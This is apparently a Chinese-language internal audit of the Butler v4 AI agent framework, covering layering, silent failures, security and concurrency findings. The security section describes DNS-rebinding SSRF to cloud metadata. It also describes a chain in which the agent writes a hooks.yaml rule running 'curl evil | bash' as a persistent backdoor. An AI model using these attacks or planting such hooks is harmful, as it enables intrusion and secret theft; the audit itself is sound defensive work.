# Project Deep Audit — 2026-06 (R1–R8)

> **状态**: 已完成 (8 轮 subagent-driven 深度检查,2026-06-05 收口)  
> **范围**: Butler v4 全栈 (butler/, tests/, scripts/, docs/, pyproject.toml)  
> **方法**: 每轮 subagent 详细扫描 → 主线程复检 → 仅记录确认问题  
> **复核原则**: subagent 报 → 主线程用 Read/Grep/Bash 实际证据校验 → 误报/不构成问题的不记入

## 复核状态总览

| Round | 主题 | 状态 | subagent 报告 | 确认问题 | 误报/排除 |
|-------|------|------|--------------|----------|----------|
| R1 | 架构与模块边界 | done | 20 | 20 | 0 |
| R2 | 错误处理 / 静默失败 | done | 25 | 25 | 0 |
| R3 | 安全 (注入/路径/shell/SSRF) | done | 13 | 13 | 0 |
| R4 | 并发 / 线程安全 | done | 15 | 15 | 0 |
| R5 | 资源管理 / 内存泄漏 | done | 20 | 19 | 1(R5-20 subagent 自评非问题) |
| R6 | 测试覆盖与质量 | done | 20 | 16 | 4(R6-9/16/18/20) |
| R7 | 文档漂移 | done | 17 | 17 | 0 |
| R8 | 配置 / feature flag / env 卫生 | done | 17 | 13 (R8-1/2 见 R7-4/7-8) | 2(R8-17 false; R8-4 降级归文档) |

## 已确认问题清单

> 写入规则: 每条记录包含 `ID / 严重度 / 文件:行 / 现象 / 复现命令 / 修复建议`。  
> 严重度: **C**=Critical(数据/安全/正确性) / **H**=High(明显质量/可维护性) / **M**=Medium(可优化) / **L**=Low(细节)

### R1 — 架构与模块边界

**R1-1 [C] layering_violation** — `butler/transport/llm_client.py:360, 383, 476`  
`transport/` 反向 `from butler.core.streaming_tools import notify_complete_tool_calls_from_stream`(3 处)。Transport 是 v4 架构图最底层(~800 行独立协议),不应回调 core。每次流式调用 LLM 都触发,导致 transport 测试必须拉起 core stack。  
**建议**: 把 `notify_complete_tool_calls_from_stream` 改成 transport 注入的回调(Protocol),或下沉到 `butler/transport/streaming_signal.py`。

**R1-2 [C] layering_violation** — `butler/core/agent_loop.py:143`  
core 顶层 import `from butler.tools.interrupt import clear_interrupt, is_interrupted, set_interrupt`;延迟 import `from butler.gateway.outbound_bridge import merge_loop_callbacks`。每个 turn 启动都从 gateway 取依赖。`tools.interrupt` 模块本身只是线程局部信号,无 tool 语义。  
**建议**: `merge_loop_callbacks` 改 caller 注入;`interrupt` 下沉到 `butler/core/interrupt.py`。

**R1-3 [C] layering_violation** — `butler/core/context_compressor.py:426`, `compaction_task.py:80,130,162`, `compaction_steer_bridge.py:33`  
> **✅ 已修复（2026-06）**：`butler/core/events_sink.py` Protocol + `NullEventsSink`；守门 `tests/test_core_events_sink_layering.py`；`core/` 无 `from butler.gateway`。
4 个 core 模块反向 import gateway:`item_events`, `gateway.hooks`, `gateway.message_queue`。每次 compact/hook/steer 触发。CLI/单元测试无法独立运行 Loop。  
**建议**: 抽 `butler/core/events_sink.py` Protocol,gateway 端实现注册。

**R1-4 [C] god_module** — `butler/gateway/platforms/wechat_ilink.py` (2027 行, 90 函数)  
单文件混合 ≥ 8 职责:AES 加解密 / CDN URL / 账户持久化 / 媒体缓存 / 2 个独立缓存类 / iLink 轮询 / 文本切片 / 6 个 send_* 协程。维护成本巨大,任何协议字段改动引发 2k 行 diff。  
**建议**: 拆 7~8 个 200~400 行子模块 `wechat/{crypto,cdn,session_store,polling,outbound,media_cache,adapter}.py`,`wechat_ilink.py` 留薄装配层。

**R1-5 [H] god_module** — `butler/tools/delegate_impl.py:237-645`  
`_tool_delegate_task` 单函数 **409 行**。delegate 工具每次调用都走完这 409 行;含 2 处延迟 gateway 导入。  
**建议**: 拆 `_prepare_task / _resolve_role / _run_subloop / _format_result / _record_telemetry`;gateway 桥接 caller 注入。

**R1-6 [H] god_module** — `butler/gateway/message_handler.py`  
`handle_message` 243-618 (376 行) + `_handle_message_locked` 619-917 (299 行)。9+ 处延迟 import(io_guardrail, human_gate, injection_guard, mcp.profiles, outbound_bridge, session_transcript, owner_gate, message_ir, gateway.queue)。每条入站消息走 600+ 行流水线。  
**建议**: 归一化器列表化注册,守门做成可组合 `InboundPipeline` 阶段,handler 只做编排。

**R1-7 [H] god_module** — `butler/main.py:999-1317`  
`_build_parser` 单函数 **319 行**;`_handle_slash_command` 261-504 (244 行)。新增子命令必须改 main.py 巨函数。  
**建议**: 子命令注册化 `commands/{chat,projects,...,registry}.py` 每个 `def register(subparsers)`;slash 命令复用 `CommandDef` 风格。

**R1-8 [H] god_module** — `butler/core/agent_loop.py:250-587`  
`_run_turn_body` 单方法 **338 行**(含 turn budget / callback / interrupt / token / ephemeral / API / guardrail / tool batch / 压缩回退)。超 100 行上限 3.4 倍。  
**建议**: 拆 `_phase_init / _phase_call_llm / _phase_dispatch_tools / _phase_finalize`,每段 80 行内。`pipeline_steps.py / loop_middleware.py` 已为重构铺垫。

**R1-9 [H] layering_violation** — `butler/transport/stream_probe.py:52`  
`from butler.ops.runtime_metrics import observe_ms`。Transport 试图把流式观测直接打到 ops,绕过 core 抽象。  
**建议**: 注入式 metric sink,transport 不应感知 ops 模块。

**R1-10 [H] layering_violation** — 7 个 tools 模块反向 import gateway  
- `butler/tools/multimodal_tools.py:40,65` → `gateway.minimax_image_gen`, `gateway.minimax_tts`  
- `butler/tools/builtin_impl.py:98,129` → `gateway.outbound_bridge`, `gateway.completion_notify`  
- `butler/tools/config_tools.py:50` → `gateway.owner_gate`  
- `butler/tools/delegate_impl.py:220,252` → `gateway.outbound_bridge`  
- `butler/tools/registry_tools.py:121` → `gateway.owner_gate`  
CLI(无 gateway)路径必须保留 gateway 模块,工具测试无法隔离。  
**建议**: `minimax_*` 是 LLM provider 调用,应放 `butler/transport/` 或 `butler/services/multimedia/`;`owner_gate`/`outbound_bridge` 改用 `execution_context` 查询。

**R1-11 [H] module_mutable** — `butler/core/exp_cache.py:23-24, 92-129`  
模块级 `_MEM_CACHE: dict`, `_MEM_LOADED: dict`,无任何锁。后续 92/106/128 行直接 `_MEM_CACHE[k] = ...`。delegate / workflow 并行触发多线程写竞争,丢失 `setdefault` 返回。  
**建议**: 加 `_LOCK = threading.RLock()`,或改 `cachetools.TTLCache` / `functools.lru_cache`。

**R1-12 [H] module_mutable** — `butler/gateway/platforms/wechat_ilink.py:158, 1042, 1058, 1956`  
模块级 `_LIVE_ADAPTERS: Dict[str, Any] = {}`,无锁。多账户 / reconnect 风暴时,长轮询循环和外部 `send_wechat_direct` 同时读写同一 dict,跨协程/线程边界。  
**建议**: `WeakValueDictionary` + `threading.Lock`,或包成 `class AdapterRegistry`。

**R1-13 [M] god_module** — `butler/orchestrator.py` (734 行, 31 方法)  
单类混合:tenant LRU 64 / Skill 合并/路由 / Memory provider 生命周期 / ProjectManager 回调 / 多层 prompt 渲染 / AgentLoop 工厂 / Lead Loop 构造。25+ 处延迟 import。  
**建议**: 抽 `SkillSubsystem / MemorySubsystem / PromptAssembler / LoopFactory`,orchestrator 仅做门面。

**R1-14 [M] god_module** — `butler/task_orchestrator.py` (791 行, 21 方法)  
`TaskOrchestrator` 类 521 行,32 处延迟 import(tools.project_tools, workflows.until_assert, experiments.outcomes)。DAG + 重试 + 救援 + workflow 变量池 + 子 loop 工厂混合。  
**建议**: 拆 `DagScheduler / TaskRetryPolicy / SubLoopBuilder / RescueRunner`。

**R1-15 [M] god_module** — `butler/memory/facade.py` (679 行, 22 方法)  
`ButlerMemoryService` 25+ 方法;facade 类持 `_orchestrator: Any`(弱类型),工具调用分发 `_remember/_recall/_forget` 全在一个类。  
**建议**: 拆 `MemoryReloader / MemoryToolDispatcher / PrefetchPipeline`;Protocol 替代 `Any`。

**R1-16 [M] module_side_effect** — `butler/config.py:16, 22`  
```python
from dotenv import load_dotenv
load_dotenv()  # 顶层
```
`import butler.config` 立即读 `.env` 写 `os.environ`,污染测试 / CI 环境,unit test 无法 deterministic 反例。  
**建议**: 抽 `init_environment()` 由 CLI/gateway 入口显式调用,或 `BUTLER_AUTO_LOAD_DOTENV=1` 开关。

**R1-17 [M] module_side_effect** — `butler/memory/observer_queue.py:167`  
`atexit.register(flush_all_observer_queues)` 顶层注册,pytest 多 session / worker 触发,干扰临时目录清理。  
**建议**: gateway/CLI 入口显式 `register_observer_flush_hook()`。

**R1-18 [M] module_side_effect** — `butler/transport/anthropic_transport.py:287-288`  
```python
from butler.transport import register_transport  # noqa: E402
register_transport("anthropic_messages", AnthropicTransport)
```
import 期间自注册,测试隔离时无法干净 reset。  
**建议**: 注册移到 `butler.transport.__init__` 或显式 `setup_default_transports()`。

**R1-19 [M] circular_import(隐性)** — 全仓库 1364 处延迟 import (主断言)  
证据:`grep -rnE "^\s+from butler\." butler/ | wc -l` = **1364**;`core/gateway/tools` 子树 = 711。代表环:
- `task_orchestrator:698` 延迟 `from butler.orchestrator import ButlerOrchestrator`
- `tools.delegate_impl:20` 同环
- `orchestrator:505,579` 延迟 `from butler.core.agent_loop import AgentLoop`
- `memory.facade:96` 延迟 `from butler.execution_context import get_current_orchestrator`  
任何一处把延迟 import 提升到顶层会 ImportError,架构稳定性完全依赖 lazy 评估。  
**建议**: 引入 `butler/contracts/` 协议层(Protocol-only),让 orchestrator / agent_loop / facade 互相依赖协议;逐步消除延迟 import。

**R1-20 [M] layering_violation** — `butler/permissions/doom_loop.py:7-8`  
```python
from butler.permissions.approvals import ApprovalRequest, is_approved, save_pending
from butler.tool_guardrails import GuardrailDecision, ToolCallSignature
```
permissions(基础引擎)依赖 `butler/tool_guardrails.py`(顶层 product 代码),"地基依赖屋顶"。  
**建议**: `GuardrailDecision` / `ToolCallSignature` 下沉到 `butler/permissions/types.py`,`tool_guardrails.py` 反向 import。

**R1 优先级建议** (按修复 ROI):
1. R1-1/R1-9: transport↔core 解耦(影响所有 provider 切换)
2. R1-2/R1-3/R1-10: core/tools→gateway 解耦(影响 CLI 独立运行)
3. R1-4: 拆 wechat_ilink.py(2027 行,最高维护成本)
4. R1-11/R1-12: 模块级可变状态加锁(并发安全必修)

### R2 — 错误处理 / 静默失败

**R2-1 [C] log_continue** — `butler/skills/consolidator.py:96-98`  
`except Exception as e: logger.warning(...); return _fallback_merge(skills)`。LLM consolidator 任意异常都走 fallback(把原 2 个 skills 加 `-merged` 后缀拼回去)。用户看到"merged" skill 以为是去重后的,实际是原始两份。**Agent loop = 用户静默拿错答案**的典型风险。  
**建议**: 区分"LLM 不可用"(warn+fallback) vs "LLM 响应损坏"(raise+let caller 决定);至少返回 `fallback_used=True` 标志供 caller 透传。

**R2-2 [C] log_continue** — `butler/memory/semantic_index.py:413-414, 458-459, 473-474`  
3 处 `except Exception: logger.warning(...); out = fts_hits[:limit]; mode = "fts-error-fallback"`。向量/混合检索任意异常(embed OOM、DB 锁、provider 鉴权失效)都降级到 FTS 关键词搜索,mode 内部记录但从不透传给模型/`/诊断`。**记忆质量塌方但用户无感**。  
**建议**: 在 system prompt 或 `last_health_summary` 加 `recall_degraded=True` 标志;`logger.error(..., exc_info=True)` 替换 `.warning`(warning 丢栈)。

**R2-3 [C] log_continue** — `butler/memory/embedding.py:251-252, 345-350`  
embedding provider 任意失败(fastembed init / openai key 失效 / 探测超时)→ `HashingEmbedder`(64-bit 局部哈希)。整个记忆子系统的召回质量塌方,但仅一行 `.warning` 通知。  
**建议**: 启动时 `logger.error` 一次性 + 在 embedder 实例上打 `degraded: true` 标签供 `/诊断` 透传实际使用的模型。

**R2-4 [C] silent_disable** — `butler/orchestrator.py:208-210`  
```python
except Exception as exc:
    logger.warning("Butler memory provider unavailable: %s", exc)
    self.memory_provider = None
```
orchestrator 顶层 hook,记忆子系统被整体静默禁用。Agent 继续跑但每个依赖 recall 的 turn 都拿空,无 degraded-mode 指示器,模型表现为"没记忆"但无解释。  
**建议**: system prompt + `last_health_summary` 报告"memory offline, this session cannot recall";`exc_info=True`。

**R2-5 [C] bad_fallback (SSRF 降级)** — `butler/registry/install_scan.py:120-125`  
```python
except Exception:
    host = (urlparse(url).hostname or "").lower()
    if host in ("localhost", "127.0.0.1", "0.0.0.0"):
        issues.append("private_url")
```
严格 SSRF 检查被 `except Exception` 降级为子串检查,漏掉 `169.254.169.254`(云元数据)、`[::1]`、`0`、RFC1918 段。**安装时 SSRF 守卫被静默弱化**。  
**建议**: 用 `validate_http_url` 文档化的具体异常类型;import 失败应当 hard-fail 拒绝安装。

**R2-6 [C] log_continue** — `butler/mcp/manager.py:171-179`  
MCP connect 任意异常 → `handle.status.degraded = True` + `last_error = str(exc)[:300]`,仅 `logger.warning`。用户调工具时才看到 "Unknown MCP tool",**不告诉用户是哪个 MCP server 挂了、哪些工具仍可用**。  
**建议**: 启动时把 degraded server 列表加进 tool manifest,让模型/`/诊断` 看得到。

**R2-7 [C] log_continue** — `butler/session/post_session.py:357-358, 412-413`  
post-session 记忆蒸馏 + 技能抽取的 per-item 异常,只 `logger.warning`,不进 `result["errors"]`(只顶层 channel error 进)。**用户收到回复后,记忆/技能是否蒸馏成功完全无感**;持续错误意味着记忆冻结、技能停止增长。  
**建议**: per-item 错误 append 到 `result["errors"]`;返回 `(applied, failed)` 计数供 `/诊断` 透传。

**R2-8 [C] log_continue (debuggability killed)** — `butler/skills/manager.py:107-122`  
`_read_frontmatter_only` 的 3 个 except + fallthrough 全部用同一句 `"Skill file missing YAML frontmatter: %s"`,无法区分"无 frontmatter" vs "unterminated frontmatter" vs "encoding error"。技能不出现时无法定位。  
**建议**: 分支报不同信息;考虑 raise `SkillLoadError` 供 `/诊断` 聚合。

**R2-9 [H] log_continue** — `butler/core/agent_loop.py:214, 227, 238, 364, 423, 552, 701, 786`(共 17 个 `except Exception`,多数仅 `.warning`,少量 `.debug`)  
8+ 个"soft"插件(sysreminder / tool selector / budget nudge / after_tools middleware / stuck-check / turn metrics)的异常,每个都 `logger.warning` 不带 `exc_info=True`。Agent 跑通但缺能力,用户不知道哪个能力丢了;`.debug` 级别在生产默认完全静默。  
**建议**: 全部 `logger.exception(..., exc_info=True)`;聚合到 `self.diagnostics["skipped"]` 供 `/诊断`。

**R2-10 [H] bad_fallback** — `butler/transport/llm_client.py:149-150, 211-212`  
`wire_tools_for_provider` 失败 → fallback 到 `transport.convert_tools(tools)`(generic 格式)。Provider 严格校验 schema 时,fallback 工具集在稍后 400 错误;模型可能基于"已知"工具发出被拒的 tool_call。  
**建议**: fallback 用 provider 自身 `list-tools` 的最小集;原 error 透传给 caller。

**R2-11 [H] log_continue (enforcement layer 失守)** — `butler/permissions/rules.py:51, 87, 405, 488, 503`  
permissions 管线 5 处 `except Exception` → `logger.warning` 后继续。Line 88 `path_outside_workspace` 显式 fail-closed (返回 True),其余 4 处 (line 488/503 workflow/experiment check) 只 `continue`,**可能让本应拒绝的 tool_call 通过**。  
**建议**: 统一 fail-closed;`logger.error(..., exc_info=True)` + "perm check broken" tag。

**R2-12 [H] bad_fallback (state corruption mask)** — `butler/registry/mcp_merge.py:147-149`  
```python
try: data = yaml.safe_load(...)
except Exception: return {}
```
YAML 损坏与"无 servers 定义"返回相同的 `{}`,后续"private_url"/"duplicate server_id" 静默漏检;用户 MCP 配置 typo 表现如"未配置"。  
**建议**: 三态(缺失/损坏/空)— 损坏显式 `logger.warning(path + err)`。

**R2-13 [H] log_continue (security signal silenced)** — `butler/skills/manager.py:227-228`  
`Skill content_path escapes skills root` 是**路径穿越**信号,但用 `.warning` 而非 `.error`;仍 `return sk`(技能以不完整态加载,模型以为有 content,实际 rendered prompt 为空)。  
**建议**: `.error`;`incomplete: true` 标志供 caller 感知。

**R2-14 [H] log_continue (主 dedup 机制失效)** — `butler/skills/similarity.py:218-221`  
LLM-based skill dedup 主路径异常 → `return None` → consolidator 把近似重复技能当作不同保留。**技能膨胀但用户无感**。  
**建议**: 区分"LLM 不可用"(warn+None) vs "LLM 响应损坏"(raise);`_last_dedup_status` 字段供 `/诊断`。

**R2-15 [H] log_continue (SSRF 降级)** — `butler/registry/skill_sources/github.py:115-126, marketplace.py:107-108, 240-247`  
`except Exception: continue` 把 `safe_registry_get` 自身的 SSRF 拒绝吞掉,表现为通用"fetch failed"。  
**建议**: 只 catch `requests.RequestException` / `httpx.HTTPError`;让 `safe_registry_get` 自己的 validation error 抛出。

**R2-16 [H] silent_pass (last-resort 错误格式化降级)** — `butler/gateway/message_handler.py:912-913`  
```python
except Exception: pass
return card or format_gateway_user_error(exc)
```
整条 gateway 流程的**最后兜底** — 错误卡片系统本身崩溃时,`format_error_card` 的失败完全静默(`pass`),用户只看到通用的 `format_gateway_user_error(exc)`,无任何 log。  
**建议**: `logger.error("error card formatting failed", exc_info=True)`。

**R2-17 [H] silent_pass** — `butler/registry/skill_sources/marketplace.py:107-108, 250-256`  
GitHub URL 解析任意异常 → `return None`,后续"URL invalid"提示掩盖了真正问题(parse 失败 vs URL 失效)。  
**建议**: 分"URL 损坏"(raise) vs "fetch 失败"(log+None)。

**R2-18 [H] data_loss (corrupt file → fresh start)** — `butler/skills/usage.py:24-30`  
`skill_usage.json` 解析失败 → `self._data = {}` **就地清零** in-memory,但不备份原文件。后续 `on_view/on_use` 从 0 开始,原始 analytics 永久丢失。  
**建议**: 损坏时 rename 为 `skill_usage.json.corrupt-<ts>` 再 fresh start;forensic 保留。

**R2-19 [H] bad_fallback (12+ 状态文件统一反模式)**  
`butler/runtime/loader.py:23-27` / `butler/mcp/config.py:196-200` / `butler/runtime/audit.py:58-61` / `butler/permissions/approvals.py:62-69` / `butler/runtime/task_store.py:73-74, 165-166, 196-197` / `butler/runtime/builtin_handlers.py:30-36` / `butler/runtime/workflow_version.py:24-26` / `butler/runtime/consistency_outcome.py:30-31` / `butler/runtime/notify.py:46-50` / `butler/human_gate.py:138-139, 302-303` / `butler/registry/install_pending.py:48-51` / `butler/memory/usage.py`  
12+ 处同一模式: 损坏的 YAML/JSON 持久态文件 → `return None / {} / default_state`,**用户无感**。最危险是 `permissions/approvals.py:62-69` — 损坏的 approvals 文件静默丢弃所有"always allow",导致**大量重提示**或用户以为"批准被遗忘"。  
**建议**: 抽 `_safe_load(path, default, *, kind)` 统一 helper,损坏时 `.corrupt-<ts>` 备份;`/诊断` 检测到损坏时显式提示"state file corrupt, please investigate"。

**R2-20 [M] log_continue (safety 机制静默失效)** — `butler/tools/data_query.py:121-124`  
DuckDB `statement_timeout` pragma 失败(DuckDB 版本不支持)→ `pass`。**查询超时安全机制被静默禁用**,长 CSV 扫描可能无限阻塞 agent loop。  
**建议**: 首次失败一次性 `logger.warning`;DuckDB 新版应支持时 re-raise。

**R2-21 [M] silent_pass** — `butler/registry/url_safety.py:43-44`  
`urlparse(url.strip())` 包 `except Exception: return False`。`urlparse` 对正常输入几乎不抛,这是过度防御;**真抛了用户无 log 知道 URL 被拒**。  
**建议**: 缩窄 except 类型;或加 `.debug` 记录被拒 URL。

**R2-22 [M] log_continue** — `butler/hooks/loader.py:144-153`  
hooks.yaml 匹配 regex 损坏 → `.warning` 后 `return False`(永不匹配)。用户配置 hook 后**永不触发**无 log 线索(注释也承认了)。  
**建议**: 标记 `rule.broken = True`;`configured_hook_summary()` 列出 broken hooks。

**R2-23 [M] silent_pass (UI 静默降级)** — `butler/gateway/memory_commands.py:255-256`, `butler/gateway/help_commands.py:110-111, 121-122`  
`/memory` / `/help <topic>` 任意异常 → `pass` / 通用 "未找到帮助主题"。用户看到**不完整答案**,但不知道是"真的没有"还是"获取失败"。  
**建议**: `lines.append("(项目 MEMORY 统计暂不可用)")` 显式占位。

**R2-24 [M] bad_fallback (SSRF 降级, 与 R2-5 同模式)** — `butler/registry/install_scan.py:120-125`  
`urlparse` 不在 try 块内,故 try 内失败只能是 `validate_http_url` import/call 出错 — 新版本 validate 抛新异常类型时,**严格 SSRF 检查被降级到子串 host 检查**,漏 `169.254.169.254` 等。  
**建议**: 严格检查作为主路径,绝不降级。

**R2-25 [M] log_continue** — `butler/skills/seed_bundled.py:33-38`  
bundled skill copy 失败 → `logger.warning`,`installed` 列表不含失败项。Agent 启动后技能数少于预期,用户**不知道是 OS 限制还是配置问题**。  
**建议**: 改为返回 `(installed, failed)` 元组,init 末尾一次性 warn。

**R2 优先级建议** (按修复 ROI):
1. **R2-19 12+ 状态文件反模式**: 抽统一 `_safe_load` helper,损坏备份 + `/诊断` 提示 (一次修复覆盖 12 个点)
2. **R2-9 agent_loop.py 17 个 except**: 全部 `.exception(..., exc_info=True)` + `diagnostics["skipped"]` 聚合
3. **R2-1/R2-2/R2-4 记忆子系统**: 用户最依赖的能力,降级到 FTS/null 无任何提示是产品级问题
4. **R2-5/R2-15 SSRF 降级**: 安全相关,直接静默弱化守卫
5. **R2-11 permissions 5 处不一致 fail-closed**: 安全相关

### R3 — 安全 (注入/路径/shell/SSRF)

**R3-1 [H] SSRF (TOCTOU)** — `butler/tools/web_fetch.py:94 vs :102`  
`is_safe_url(target)` 在 line 94 解析 DNS 校验 IP 不在私网,line 102 `urlopen(req, ...)` **重新解析 DNS 不 pin**。攻击者控制的 hostname(DNS rebinding 服务 `1u.ms`/`rbndr.us`)在 94→102 之间翻转 A 记录从公网到私网,绕过 SSRF 守卫,读取 `169.254.169.254`(IMDS)/ 内部 admin UI。  
**建议**: 复用 `butler/registry/url_safety.py:85 _pinned_dns` 模式 — 解析一次,通过 custom `HTTPConnection` 连 pinned IP,`Host` header 保持原 hostname 用于 SNI;拒重定向。

**R3-2 [H] Untrusted-config → RCE chain** — `butler/hooks/loader.py:86` + `butler/tools/path_safety.py:377-415`  
`<workspace>/.butler/hooks.yaml` **不在 sensitive_paths 拦截列表里**(只拦了 `~/.bashrc` 等)。LLM 通过 `tool_write_file` 写一次 hook rule(匹配 `*` 的 `PostToolUse` + `curl evil | bash`),**单次写入即持久后门**,跨 session 持续。  
**建议**: `_sensitive_path_error` 加 `<workspace>/.butler/**` 和 `<workspace>/.butler/hooks.yaml`(`for_write=True`);或 hooks 只允许 `~/.butler/.butler/hooks.yaml` 全局位置 + 显式 owner 批准 reload。

**R3-3 [H] Hooks 以 `bash -c` + 全 env 运行** — `butler/hooks/runner.py:522-531`  
```python
subprocess.run(["bash", "-c", rule.command], shell=False, env=os.environ, timeout=30)
```
`shell=False` 防经典注入,但 `rule.command` 本身就是**完全受信的 bash 脚本**,无 AST allowlist(对比 `terminal_impl.py` 有)、无 per-rule 批准、无网络/文件系统 gate,**继承整个 `os.environ`**(PATH/HOME/proxy/`ANTHROPIC_API_KEY`)。  
**建议**: (a) owner-gate 首次出现某 `command hash` 时需批准(类比 `terminal_pattern_approval.py`);(b) env 拒 `LD_PRELOAD`/`PATH`(复用 MCP stdio `_PROTECTED_ENV_KEYS`);(c) 命令过 `terminal_impl` 同一 allowlist。

**R3-4 [M] SSRF (TOCTOU, mitigated)** — `butler/tools/download_tools.py:71-85 vs :120+`  
`_resolve_public_ip` 解析后拒私网,`_tool_download_file` `urlopen` 不 pin。同 R3-1 模式,但默认 allowlist 主机(`github.com`/`pypi.org`/`raw.githubusercontent.com`/`objects.githubusercontent.com`/`files.pythonhosted.org`)声誉良好,实际暴露面接近 0。  
**建议**: 同 R3-1 复用 `_pinned_dns`。

**R3-5 [M] execute_code "no network by default" 误导** — `butler/tools/execute_code.py:82-86`  
只清 `HTTP_PROXY`/`HTTPS_PROXY`/`ALL_PROXY`/`NO_PROXY=*` — 阻的是**代理使用**,不阻 raw socket。`socket.create_connection(('169.254.169.254', 80))` 仍可工作;tool description `:133` 写 "no network by default" 与实际不符。  
**建议**: 改描述"blocks HTTP(S) proxy traffic only; raw sockets still work";真隔离需 `unshare -n`/seccomp(超出本次);或 `sys.setprofile` 计数 `socket.socket.connect` 调用并 warn。

**R3-6 [M] MCP HTTP 无 DNS rebinding 检查** — `butler/mcp/config.py:224-239` + `mcp/client_http.py:21`  
`validate_http_url` 仅字符串级: scheme ∈ {http,https} + host 不在 `_PRIVATE_HOSTS` + `hosts_allow` 后缀匹配。**无 DNS 解析**。Operator 把 `mcp.example.com` 加 allowlist,DNS 后被翻到 `10.0.0.5` → MCP client 连内网 → 内部服务响应被当作 trusted MCP 工具输出 → 间接 RCE。  
**建议**: 启动时一次性 `socket.getaddrinfo` 拒私网;HTTPS 用 cert mismatch 检测被翻 IP;或复用 `_pinned_dns`。

**R3-7 [M] wechat_ilink `chmod 0o600` 冗余 (TOCTOU 窗口)** — `butler/gateway/platforms/wechat_ilink.py:289-291, 353-355, 781`  
```python
atomic_json_write(path, payload)  # atomic_write_text 已在 open 时 0o600
try: path.chmod(0o600)            # 冗余,反而开了第二个 syscall 的窗口
```
`os.replace` 和 `chmod` 之间毫秒级窗口,同盘其他进程可按 default umask 读 bot token / session secret / get_updates_buf。  
**建议**: 删除冗余 `chmod`;`atomic_write_text` 已在 `atomic_write.py:29` open 时设 0o600。

**R3-8 [M] Hooks YAML 无签名/owner 校验** — `butler/hooks/loader.py:71-87` + `runner.py:509-531`  
任何 `<workspace>/.butler/hooks.yaml` 都被作为受信规则源加载,无 `stat()` 属主检查、无签名、无 allowlist(只受 workspace 路径影响)。**含 `.butler/hooks.yaml` 的仓库即等同 shell login 脚本**。  
**建议**: (a) hooks.yaml 必须 `os.getuid()` 拥有 + 不可组写;(b) per-project `enable_workspace_hooks: bool` 显式开关;(c) 首次加载新 workspace 一次性 warn。

**R3-9 [L] vector_store.text_hash MD5 截 12 hex (48 bit)** — `butler/memory/vector_store.py:82`  
`hashlib.md5(text.encode()).hexdigest()[:12]`。2^48 ≈ 2.8e14,birthday collision ~1.7e7 strings 时出现。**向量库去重键碰撞 = 两条不同文本共享一个向量条目 → 检索腐化**。非安全 primitive(无对手 crafting collisions),但数据完整性弱。  
**建议**: `hashlib.blake2b(text.encode(), digest_size=16).hexdigest()`(128-bit,速度近 MD5)。

**R3-10 [L] observer_queue.content_hash 用 SHA1** — `butler/memory/observer_queue.py:94`  
同 R3-9,非安全场景但 SHA1 已知 collision-vulnerable。  
**建议**: 换 `hashlib.blake2b(digest_size=16)`。

**R3-11 [L] wechat_ilink 入站内容去重用 MD5** — `butler/gateway/platforms/wechat_ilink.py:1189`  
`content_key = f"content:{sender_id}:{hashlib.md5(text.encode()).hexdigest()}"`(5 分钟 TTL)。128-bit MD5 实际仍 collision-immune,但 key 无 nonce/timestamp,同 sender_id 重复内容即被 dedup。`rawfilemd5` at `:1752` 受 WeChat API 契约约束不能改。  
**建议**: bump SHA256,加 timestamp 组件。

**R3-12 [L] data_query `SET statement_timeout` 用 f-string** — `butler/tools/data_query.py:122`  
`con.execute(f"SET statement_timeout='{_QUERY_TIMEOUT_SECONDS}s'")` — 常量值,无现实 exploit,但 f-string-in-SQL 是 linter 警示,未来 PR 让值可配置时立即变真注入。  
**建议**: `con.execute("SET statement_timeout=?", [_QUERY_TIMEOUT_SECONDS])`(DuckDB 可能不接参,折中:加常量注释 + 类型 guard)。

**R3-13 [L] llm_client `"dummy"` sentinel** — `butler/transport/llm_client.py:85, 101`  
API key 缺失时 `api_key = "dummy"` 占位。若下游错误 handler 意外序列化 header,sentinel 会作为真 auth header 发出。低概率。  
**建议**: `api_key: str | None = None` + `is None` 守门,或加 "DO NOT send as header" 注释。

**R3 优先级建议** (按修复 ROI):
1. **R3-2** (1 行 path_safety 加 `<workspace>/.butler/**`): 直接切断 LLM → 持久 RCE 链
2. **R3-1** (`_pinned_dns` 复用): web_fetch 是攻击者最直接的 internet→内网入口
3. **R3-3** (hooks 沙箱化): 减少已有 RCE 的爆炸半径
4. **R3-8** (hooks owner 校验): 防御性纵深
5. **R3-6** (MCP DNS 校验): 远程 MCP 信任面问题

### R4 — 并发 / 线程安全

**R4-1 [C] missing_lock (cache LRU 多步非原子)** — `butler/core/tool_result_cache.py:24, 80-100`  
模块级 `_STORE: dict[scope_key][tool_name] = _CacheEntry`,无锁。`set_cached_result` 流程:`setdefault` → `len` → `sorted` → `pop` → `__setitem__`(5 步非原子)。`get_cached_result` 是 `get` + `pop` 两步。并发场景下:bucket 超 `_MAX_PER_SCOPE`、`pop` KeyError、或**刚插入的 entry 被 evict**。`result cache` 是 dedupe/short-circuit 的依据,**race 会导致重复 tool_call 或错输出**。  
**建议**: 模块级 `threading.RLock()`;LRU 改 `OrderedDict.move_to_end` + `popitem(last=False)`。

**R4-2 [C] file_race (TOCTOU read-merge-write)** — `butler/runtime/task_store.py:133-140`  
```python
def update_task(task_id, **fields):
    record = get_task(task_id)   # READ
    record.update(fields)        # MUTATE
    _write(task_id, record)      # WRITE
```
Delegate 完成路径 + stale 回收器(`mark_stale_tasks:60-90`)并发改同一 task_id → **lost update**。Runtime task store 状态腐化,影响下游 observers + UI。  
**建议**: per-`task_id` 锁(复用 `skill_lock._PATH_LOCKS_GUARD` 模式);或 monotonic version 字段 CAS。

**R4-3 [C] missing_lock (gate 一致性)** — `butler/human_gate.py:184-201, 313-354`  
`_gate_lock` 只在 `mark_step_approved` (189) 和 `resolve_human_gate_message` (319) 持有。`is_step_approved` (180) / `clear_session_gates` (195) / `check_workflow_step_approval` (209-232) **绕过**。`clear_session_gates` + `resolve_human_gate_message` 并发可让刚 clear 的 approval "复活";`is_step_approved` 可读到 resolver 中途的脏数据。**Gate 是 agent 继续/阻塞的判定,stale read 是 correctness bug**。  
**建议**: 所有 read/write 走单一 `with _gate_lock:` 临界区;in-memory mutate → 持久化,避免每次从盘重读。

**R4-4 [H] missing_lock (lock-released-too-early)** — `butler/transport/provider_health.py:47-67, 81-92`  
`_get_state(key)` 在 lock 内 `return st` — `_CircuitState` 引用逃出锁。`is_circuit_open` (56-67) 释放锁后 `st.open_until = 0.0; st.failures = 0`(mutation outside lock)。`record_provider_failure` 在 lock 内 `st.failures += 1` — 两者并发可重置刚记录的失败或反之。**Circuit breaker 自身契约被破**。  
**建议**: (a) 所有 read+mutation 在同一 `with _STATE_LOCK:`;或 (b) `_CircuitState` 改 immutable,每次返回新对象。

